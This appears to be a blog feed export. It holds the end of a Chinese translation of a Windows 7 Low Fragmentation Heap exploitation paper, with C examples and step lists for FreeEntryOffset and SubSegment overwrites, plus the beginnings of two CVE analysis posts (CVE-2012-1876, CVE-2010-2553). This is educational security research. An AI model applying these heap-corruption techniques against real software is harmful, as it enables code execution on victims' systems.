class="comment">//进行分配时，这将为我们提供0xFFFF * 0x8字节的前向范围,有足够的空间覆盖任何Dollar对象</span></span><br><span class="line">dollar3 = alloc(first_len);</span><br><span class="line"><span class="built_in">memcpy</span>(dollar3, data, first_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//one or more of these can be overwritten with data copied into dollar3</span></span><br><span class="line"><span class="comment">//其中一个或多个可以用复制到dollar3中的数据覆盖</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    dollars[i].INeedDollar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在此简单函数的开始处，有个明显的integer wrap，后面跟了一个潜在的缓冲区溢出。但是和以往的漏洞利用方法不同的是，我们不能通过简单的覆盖一些元数据来达成代码执行。我们需要覆盖在dollar2数据区域中存储的FreeEntryOffset来控制分配dollar3时返回的地址。</p><p>&emsp;&emsp;我们假定LFH为Bucket[0x6](0x30字节)已经启用，也假定dollar1是第一个分配给Bucket[0x6]的Chunk(这只是为了简单起见。对于特定大小，它实际上不需要是LFH的第一个分配)。UserBlock状态看起来如下：</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Userblock_after_chunking.png" alt="Userblock after chunking"></p><p style="text-align:center;font-weight:bold">Diagram 18. Userblock after chunking</p><p>&emsp;&emsp;在dollar1被分配后，随后的溢出会覆盖下一个空闲堆Chunk，FreeEntryOffset被更新为下一个Chunk的偏移(应是0x0008 chunk)。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/FreeEntryOffset_Overwrite.png" alt="FreeEntryOffset Overwrite"></p><p style="text-align:center;font-weight:bold">Diagram 19. FreeEntryOffset Overwrite</p><p>&emsp;&emsp;此时，NextOffset已经被我们控制的值所覆盖，但是为了使用此偏移量我们需要进行下一次分配，这一次该值会存储在_INTERLOCK_SEQ 中以供将来使用。在这个例子中，此分配就是为dollar2分配内存时发生的。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Second_allocation_setting_overwritten_FreeEntryOffset.png" alt="Second allocation setting overwritten FreeEntryOffset"></p><p style="text-align:center;font-weight:bold">Diagram 20. Second allocation, setting overwritten FreeEntryOffset</p><p>&emsp;&emsp;现在我们有了一个0x1501的FreeEntryOffset。该值会超出UserBlock所在的分配页，因此相邻的内存页中的Chunk内容会被覆盖。(并不总是这个值。如果在内存页上有完美的数据可以覆写，那么覆写的Offset可以是0x0000-0xFFFF之间的任意值)。</p><p>&emsp;&emsp;在此示例中，相邻内存是在构造0x20 Dollar对象数组时创建的(我们假定它们是0x40字节宽)。一旦Bucket[0x8]的LFH被启用(0x40字节)，您将拥有一个类似于下图的整体内存布局：</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Multiple_UserBlocks.png" alt="Multiple UserBlocks"></p><p style="text-align:center;font-weight:bold">Diagram 21. Multiple UserBlocks</p><p>&emsp;&emsp;此时就形成了一个相当有利的局面来覆写函数指针或虚表指针。下一个0x30字节的分配会返回内存地址0x5162016，因为下一个空闲条目是由当前的UserBlock[0x5157800]计算出来的，UserBlocks加上当前偏移(0x0E)，最后再加上FreeEntryOffset(0x1501) * 8 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NextChunk = UserBlock + Depth_IntoUserBlock + (FreeEntryOffset * 8)</span><br><span class="line">NextChunk = 0x5157800 + 0x0E + (0x1501 * 8)</span><br><span class="line">NextChunk = 0x5162016</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这意味着一旦我们分配了dollar3并写入0x30字节的数据，我们就可以覆盖Dollar array中的对象。覆盖的偏移甚至可以调整成指向数组内部特定的对象。尽管该例子非常简单，攻击了应用程序在堆上的数据，但它仍然可以用在多种n字节覆盖的方法中。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Cross_page_overwrite.png" alt="Cross page overwrite"></p><p style="text-align:center;font-weight:bold">Diagram 22. Cross page overwrite</p><h5 id="Step-by-Step-步步为营-1"><a href="#Step-by-Step-步步为营-1" class="headerlink" title="Step-by-Step(步步为营)"></a>Step-by-Step(步步为营)</h5><ol><li>激活LFH</li><li>为你启用LFH的Bucket大小分配一个Chunk(dollar1)</li><li>溢出dollar1至少0x9字节(0xA更好)，覆写直接相邻的空闲Chunk，它会在下一次分配中返回</li><li>为你启用LFH的Bucket大小分配一个Chunk(dollar2)，它会将被覆盖的NextOffset存储到_INTERLOCK_SEQ中的FreeEntryOffset</li><li>分配一个对象，它用于被覆盖。该分配需要部署在FreeEntryOffset(0x08*0xFFFF是最大值)可触摸的范围内。本例，Dollar对象位于相邻的内存页中。</li><li>为你启用LFH的Bucket大小分配一个Chunk(dollar3)，这将返回基于覆盖的FreeEntryOffset所选择的地址</li><li>写入n字节，覆盖关键对象</li><li>调用覆盖的函数指针或虚函数</li></ol><h5 id="Prerequisites-前提条件-1"><a href="#Prerequisites-前提条件-1" class="headerlink" title="Prerequisites(前提条件)"></a>Prerequisites(前提条件)</h5><ul><li>可以为特定Bucket激活LFH</li><li>可以控制特定Bucket的分配</li><li>至少可以覆盖0x9字节，最好0xA字节</li><li>可以覆写相邻的空闲Chunk</li><li>要覆盖的对象应在最大可触范围(0xFFFF*0x8)内存之内</li><li>可以触发使用被覆盖对象的方法</li></ul><h5 id="Methodology-方法论-1"><a href="#Methodology-方法论-1" class="headerlink" title="Methodology(方法论)"></a>Methodology(方法论)</h5><ol><li>激活LFH</li><li>标准化堆</li><li>Alloc 1</li><li>覆盖相邻Chunk的NextOffset，之后会被存储在_INTERLOCK_SEQ中的FreeEntryOffset</li><li>Alloc 2</li><li>Alloc 3</li><li>写入数据到Alloc3(这会覆盖感兴趣的对象)</li><li>触发</li></ol><h3 id="Observations-观察结果"><a href="#Observations-观察结果" class="headerlink" title="Observations(观察结果)"></a>Observations(观察结果)</h3><p>&emsp;&emsp;尽管本节展现的资料更应该放到Exploitation这一部分中，我还是认为放在Observations下更好一些。其背后的原因是在尝试使用此技术来导致代码执行时缺乏可靠性。我想做的最后一件事是实际上将一个感兴趣的项目放在Exploitation部分，就像Sinan Erin所说的那样，是草莓布丁。</p><h4 id="SubSegment-Overwrite-覆写SubSegment"><a href="#SubSegment-Overwrite-覆写SubSegment" class="headerlink" title="SubSegment Overwrite(覆写SubSegment)"></a>SubSegment Overwrite(覆写SubSegment)</h4><p>&emsp;&emsp;我们在Allocation(分配)一节中看到LFH会在分配内存时试图使用SubSegment。如果当前没有可用的Subsegment，他就会为UserBlock 分配空间，然后继续获取SubSegment。</p><p style="text-align:center;font-weight:bold">Listing 52. SubSegment acquisition</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">HEAP_SUBSEGMENT *SubSeg = HeapLocalSegmentInfo‐&gt;ActiveSubsegment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(SubSeg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line">        <span class="comment">//checks to ensure valid subsegment</span></span><br><span class="line">        <span class="comment">//检查以确保是有效的Subsegment</span></span><br><span class="line">        _HEAP_USERDATA_HEADER *UserBlocks = SubSeg‐&gt;UserBlocks;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!Depth || !UserBlocks || SubSeg‐&gt;LocalInfo != HeapLocalSegmentInfo)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line">        .</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">_HEAP_USERDATA_HEADER *UserData = RtlpAllocateUserBlock(lfh, UserBlockCacheIndex, BucketByteSize + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">DeletedSubSegment = ExInterlockedPopEntrySList(HeapLocalData);</span><br><span class="line"><span class="keyword">if</span> (DeletedSubSegment)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if there are any deleted subsegments, use them</span></span><br><span class="line">    <span class="comment">// 如果存在被删除的Subsegments，就使用它们</span></span><br><span class="line">    NewSubSegment = (_HEAP_SUBSEGMENT *)(DeletedSubSegment ‐ <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    _HEAP_SUBSEGMENT *NewSubSegment = RtlpLowFragHeapAllocateFromZone(LFH, LocalDataIndex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return failure use back‐end</span></span><br><span class="line">    <span class="comment">//返回失败，使用后端堆管理器</span></span><br><span class="line">    <span class="keyword">if</span>(!NewSubSegment)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this function will setup the _HEAP_SUBEMENT structure</span></span><br><span class="line"><span class="comment">//and chunk out the data in 'UserData' to be of HeapBucket‐&gt;SizeIndex chunks</span></span><br><span class="line"><span class="comment">//此函数将设置_HEAP_SUBEMENT结构并将“UserData”中的数据分块为HeapBucket-&gt;SizeIndex大小的Chunks</span></span><br><span class="line">RtlpSubSegmentInitialize(LFH,</span><br><span class="line">                         NewSubSegment,</span><br><span class="line">                         UserBlock,</span><br><span class="line">                         RtlpBucketBlockSizes[HeapBucket‐&gt;SizeIndex],</span><br><span class="line">                         UserDataAllocSize,HeapBucket);</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;该执行流通常发生在_HEAP_SUBSEGMENT还没有设置的时候(例如：LFH第一次为特定Bucket分配)或者所有的SubSegments都用完了。这种情况下内存布局看起来如下图：</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/UserBlock_residing_before_SubSegment_pointers_in_memory.png" alt="UserBlock residing before SubSegment pointers in memory"></p><p style="text-align:center;font-weight:bold">Diagram 23. UserBlock residing before SubSegment pointers in memory</p><p>&emsp;&emsp;如你所见，如果你把UserBlock Chunk放置在为SubSegments分配的内存之前，那么溢出就可以覆盖_HEAP_SUBSEGMENT结构所用的指针。尽管Richard Johnson论证了_LFH_BLOCK_ZONE的FreePointer可能会受到损坏，以将_HEAP_SUBSEGMENT结构写入半任意位置(Johnson 2006)，我却有个不同的想法。你可以覆写SubSegment，包括UserBlock指针。然后继续进行后续分配，此时就可以用用户提供的指针进行n字节覆写。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Overwrite_into__HEAP_SUBSEGMENT.png" alt="Overwrite into _HEAP_SUBSEGMENT"></p><p style="text-align:center;font-weight:bold">Diagram 24. Overwrite into _HEAP_SUBSEGMENT</p><h4 id="Example-示例-2"><a href="#Example-示例-2" class="headerlink" title="Example(示例)"></a>Example(示例)</h4><p>&emsp;&emsp;下面的例子展示了LFH Bin如何为特定大小激活，然后后续的分配覆写了_HEAP_SUBSEGMENT，导致后续分配时使用了污染的数据。注意到覆盖大小为0x200，该值不是一个特定的值，只是用来表明所有_LFH_BLOCK_ZONE项都可以被覆盖。</p><p style="text-align:center;font-weight:bold">Listing 53. SubSegment overwrite</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//turn on the LFH</span></span><br><span class="line"><span class="comment">//激活LFH</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x12</span>; i++)</span><br><span class="line">    allocb[i] = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//first allocation for SIZE in LFH</span></span><br><span class="line"><span class="comment">//在LFH分配第一个大小为SIZE的Chunk</span></span><br><span class="line">alloc1 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//get closer in virtual memory to make overwrite easier</span></span><br><span class="line"><span class="comment">//更接近虚拟内存，使覆写更容易</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x27</span>; i++)</span><br><span class="line">    alloc2 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//overwrite the UserBlocks pointer for this SubSegment</span></span><br><span class="line"><span class="comment">//覆盖这个SubSegment的UserBlocks指针</span></span><br><span class="line">alloc3 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br><span class="line"><span class="built_in">memset</span>(alloc3, <span class="number">0x41</span>, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//this allocation will use the tainted UserBlocks</span></span><br><span class="line"><span class="comment">//这个分配将使用受污染的UserBlocks</span></span><br><span class="line">alloc4 = HeapAlloc(pHeap, <span class="number">0x0</span>, SIZE);</span><br></pre></td></tr></table></figure><h4 id="Issues-问题"><a href="#Issues-问题" class="headerlink" title="Issues(问题)"></a>Issues(问题)</h4><p>&emsp;&emsp;这种技术的利用主要有两大阻碍。第一个是需要具备一种对堆可以精准操控的手法。如实例中所展现，UserBlock Chunk需要在内存被用来存储SubSegment指针(_LFH_BLOCK_ZONE)之前分配出来。虽然启用LFH Bin很简单，但在现实情况下，想要保证它布置在连续的内存上且在SubSegment指针所用的Chunk之前会更为困难。你只要去看看Internet Explorer就可以了解到这项任务是多么的困难。</p><p>&emsp;&emsp;第二个难点是要避免分配过程中保证SubSegment的完整性的检查。这将确保所请求大小的_HEAP_LOCAL_SEGMENT_INFO结构，和当前存储在_HEAP_SUBSEGMENT的那一个匹配。</p><p style="text-align:center;font-weight:bold">Listing 54. SubSegment validation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_HEAP_LOCAL_SEGMENT_INFO *HeapLocalSegmentInfo = HeapLocalData‐&gt;SegmentInfo[HeapBucket‐&gt;SizeIndex];</span><br><span class="line"></span><br><span class="line">_HEAP_SUBSEGMENT *SubSeg = HeapLocalSegmentInfo‐&gt;ActiveSubsegment;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="keyword">if</span>(!Depth || !UserBlocks || SubSeg‐&gt;LocalInfo != HeapLocalSegmentInfo)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;虽然Depth和UserBlocks条件很容易被欺骗，但确保LocalInfo结构与存储在LFH中的指针是同一个的检查要复杂一些。使用一个已泄露的Chunk地址是一种解决此问题的可行方案，但是应用程序运行的时间越久，想要可靠地预测一个地址就越困难。最简单的方法就是通过HeapBase来获取FrontEndHeap指针的地址。这将为我们提供一个指向_LFH_HEAP结构的指针，此后相应的_HEAP_LOCAL_SEGMENT_INFO条目地址就可以由请求的Chunk大小来推断出来。</p><p>&emsp;&emsp;总的来说，该技术提供了一个非常简单的write-n情景，完全依赖于堆元数据以及需要覆写的地址。不幸的是，在撰写本文之际，还是没能挖掘出一种更为可靠的技巧。这并非不可能，而是我屡试屡败最终选择了放弃。</p><h2 id="Conclusion-结论"><a href="#Conclusion-结论" class="headerlink" title="Conclusion(结论)"></a>Conclusion(结论)</h2><p>&emsp;&emsp;Windows内存管理的各个方面自Windows XP以来都有相当的改变。这些变化的绝大多数最早发生在Windows Vista诞生之初，并一直延续到了Windows 7。</p><p>&emsp;&emsp;使用的数据结构更为复杂，对多线程发起的频繁的内存请求有了更好的支持，但仍然与过去的堆实现机制有着一定的相似之处。</p><p>&emsp;&emsp;这些新的数据结构使用的风格和之前不同。专用FreeLists这一设计已经被新的更为鲁棒的设计取缔。这些新的技术提供了后端堆管理器去启用前端堆管理器的方式，当前的前端堆管理器只支持LFH，Lookaside链表已经过时了。现在，一种称为UserBlock的新结构在满足某些阈值后将HeapBucket的所有Chunks保存在一个连续的大内存块中。这为频繁的分配和释放提供了更为有效的内存访问方式。</p><p>&emsp;&emsp;尽管后来增加了多种安全机制，比如头部编码，反位图翻转(anti-bitmap flipping)以及安全链接(safe linking)，依然有着新的精准操控堆的可靠手法诞生。现在相同大小的Chunk可以在内存空间中连续部署，因此覆盖可以更容易预测，并且可以通过简单地控制分配和释放来获取数据播种。</p><p>&emsp;&emsp;所有新创建的数据结构和算法都带来了新的复杂性。正如Ben Hawkes之前和我在本文中所展示的那样，这种复杂性可以用来控制执行流。新的偏移量和指针可在简单的溢出情况下使用，以更改堆的状态并提供更好的可靠的执行方式。</p><p>&emsp;&emsp;最后，尽管覆写元数据可以改变程序执行流，但对比以往的可用性大打折扣。堆利用变得越来越复杂，并且随着时间的流逝，相比较所想要覆写的数据，对分配和释放操作以及Chunks布局的深层次理解将变得更为重要(更别提破坏DEP和ASLR了)。可能看起来讨论前端和后端管理器到如此深的层次不是很有必要，但是想要游刃有余的操控堆，你必须理解它底层的工作机制。</p><ul><li>Chris Valasek 2010<ul><li>@nudehaberdasher</li><li>cvalasek@gmail.com</li></ul></li></ul><h2 id="Bibliography-参考文献"><a href="#Bibliography-参考文献" class="headerlink" title="Bibliography(参考文献)"></a>Bibliography(参考文献)</h2><ol><li><a href="http://www.lateralsecurity.com/downloads/hawkes_ruxcon-nov-2008.pdf" target="_blank" rel="noopener">Hawkes, Ben. 2008. Attacking the Vista Heap. Ruxcon 2008</a></li><li><a href="http://www.blackhat.com/presentations/bh-usa-08/Hawkes/BH_US_08_Hawkes_Attacking_Vista_Heap.ppt" target="_blank" rel="noopener">Hawkes, Ben. 2008. Attacking the Vista Heap. Blackhat USA 2008</a></li><li><a href="http://debugger.immunityinc.com/update/Documentation/ref/Libs.libheap-pysrc.html" target="_blank" rel="noopener">Immunity Inc. Immunity Debugger heap library source code. Immunity Inc.</a></li><li><a href="http://rjohnson.uninformed.org/Presentations/200703%20EuSecWest%20-%20Windows%20Vista%20Exploitation%20Countermeasures/rjohnson%20-%20Windows%20Vista%20Exploitation%20Countermeasures.ppt" target="_blank" rel="noopener">Johnson, Richard. 2006. Windows Vista: Exploitation Countermeasures. Toorcon 8</a></li><li><a href="http://www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf" target="_blank" rel="noopener">McDonald/Valasek. 2009. Practical Windows XP/2003 Heap Exploitation. Blackhat USA 2009</a></li><li><a href="http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Marinescu.pdf" target="_blank" rel="noopener">Marinescu, Adrian. 2006. Windows Vista Heap Management Enhancements. Blackhat USA 2006</a></li><li><a href="http://www.insomniasec.com/publications/Exploiting_Freelist%5B0%5D_On_XPSP2.zip" target="_blank" rel="noopener">Moore, Brett. 2005. Exploiting Freelist[0] on XP Service Pack 2. Security-Assessment.com White Paper</a></li><li><a href="http://www.insomniasec.com/publications/Heaps_About_Heaps.ppt" target="_blank" rel="noopener">Moore, Brett. 2008. Heaps About Heaps. SyScan 2008</a></li><li><a href="http://www.i.u-tokyo.ac.jp/edu/training/ss/lecture/new-documents/Lectures/16-UserModeHeap/UserModeHeapManager.ppt" target="_blank" rel="noopener">Probert, David B. (PhD). UserMode Heap Manager</a></li><li><a href="http://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf" target="_blank" rel="noopener">Sotirov, Alexander. 2007. Heap Feng Shui in JavaScript. Black Hat Europe 2007</a></li><li><a href="http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf" target="_blank" rel="noopener">Vreugdenhil, Peter. 2010. Windows7-InternetExplorer8. Pwn2Own 2010</a></li><li><a href="http://eticanicomana.blogspot.com/2010/03/aleatory-persitent-threat.html" target="_blank" rel="noopener">Waisman, Nico. 2010. (A)leatory (P)ersitent (T)hreat</a></li></ol>]]></content>
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Heap </tag>
            
            <tag> LFH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2012-1876复现与分析</title>
      <link href="/2021/02/16/CVE-2012-1876%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2021/02/16/CVE-2012-1876%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><p><a href="https://github.com/ser4wang/BrowserSecurity/blob/master/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876.md" target="_blank" rel="noopener">GitHub - IE8堆溢出漏洞CVE-2012-1876</a><br><a href="https://eternalsakura13.com/2018/03/10/cve2012_1876/" target="_blank" rel="noopener">Sakuraのblog - CVE-2012-1876调试笔记</a><br><a href="https://www.exploit-db.com/exploits/24017" target="_blank" rel="noopener">Exploit-DB - Microsoft Internet Explorer 8 - Fixed Col Span ID (Full ASLR + DEP Bypass) (MS12-037)</a><br><a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/" target="_blank" rel="noopener">漏洞战争-cve-2012-1876</a><br><a href="https://bbs.pediy.com/thread-265998.htm" target="_blank" rel="noopener">看雪 - Internet Explorer漏洞分析(一)——CVE-2012-1876</a><br><a href="https://web.archive.org/web/20120713043033/http://www.vupen.com/blog/20120710.Advanced_Exploitation_of_Internet_Explorer_HeapOv_CVE-2012-1876.php" target="_blank" rel="noopener">VUPEN - Advanced Exploitation of Internet Explorer Heap Overflow (Pwn2Own 2012 Exploit)</a><br><a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/" target="_blank" rel="noopener">Migraine殇 - IE堆漏洞利用（CVE-2012-1876）</a><br><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/internet-explorer/ie-developer/platform-apis/hh801968(v=vs.85" target="_blank" rel="noopener">Microsoft Docs - Internet Explorer C++ Reference</a>)<br><a href="https://bbs.pediy.com/thread-214226.htm" target="_blank" rel="noopener">看雪 - cve-2012-1876漏洞详解</a><br><a href="https://www.4hou.com/posts/vDZL" target="_blank" rel="noopener">4hou - 被玩坏的IE浏览器——漏洞利用方法和技巧介绍</a><br><a href="https://labs.f-secure.com/blog/internet-exploiter-understanding-vulnerabilities-in-internet-explorer/" target="_blank" rel="noopener">F-Secure - Internet Exploiter: Understanding Vulnerabilities in Internet Explorer</a></p>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2010-2553复现与分析</title>
      <link href="/2021/01/10/CVE-2010-2553%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2021/01/10/CVE-2010-2553%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>这个漏洞是《漏洞战争》中的堆溢出漏洞章节中使用的例子。<br>堆溢出漏洞比栈溢出漏洞更难发现，漏洞利用难度相对于栈溢出漏洞也更难。<br>栈溢出漏洞已经很少见了，堆溢出的漏洞越来越多，所以学习堆溢出漏洞的分析更加有必要。<br>此漏洞涉及到AVI文件的构造，所以需要了解AVI文件格式的构成，更多细节可以看《AVI文件格式分析》的文章。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2553" target="_blank" rel="noopener">CVE-2010-2553</a>是<code>Windows XP SP2</code>和<code>Windows XP SP3</code>、<code>Windows Vista SP1</code>和<code>Windows Vista SP2</code>以及<code>Windows 7</code>中的<code>Cinepak</code>视频编解码器(<code>iccvid.dll</code>)不能正确解压媒体文件，这使得<code>远程攻击者</code>可以通过一个精心制作的文件<code>执行任意代码</code>，也称为<code>“Cinepak视频编解码器解压漏洞”</code>。<code>Cinepak</code>视频编解码器(<code>iccvid.dll</code>)中的<code>CVDecompress函数</code>解压缩媒体文件时，未对<code>“Cinepak(CVID) Stream Format”</code>中的<code>“Number of coded strips(Frame Header)”</code>进行限制，导致在复制数据时造成<code>堆溢出</code>，利用此漏洞可造成<code>程序奔溃</code>或者<code>执行任意代码</code>。此漏洞的<code>微软漏洞编号</code>为<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">MS10-055</a>。</p><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:left">使用的环境</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">操作系统</td><td style="text-align:left">Windows XP SP3</td><td style="text-align:left">版本号:Windows XP Professional SP3 简体中文版</td></tr><tr><td style="text-align:center">虚拟机</td><td style="text-align:left">VMWare Workstations</td><td style="text-align:left">版本号:15.5.1</td></tr><tr><td style="text-align:center">调试器</td><td style="text-align:left">WinDbg</td><td style="text-align:left">版本号:v6.12(x86)</td></tr><tr><td style="text-align:center">反汇编器</td><td style="text-align:left">IDA Pro</td><td style="text-align:left">版本号:7.0</td></tr><tr><td style="text-align:center">视频软件</td><td style="text-align:left">Microsoft Media Player</td><td style="text-align:left">版本号:10.00.00.3802</td></tr><tr><td style="text-align:center">漏洞模块</td><td style="text-align:left">Cinepak for Windows 32(iccvid.dll)</td><td style="text-align:left">版本号:1.10.0.12,Windows系统模块</td></tr></tbody></table><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 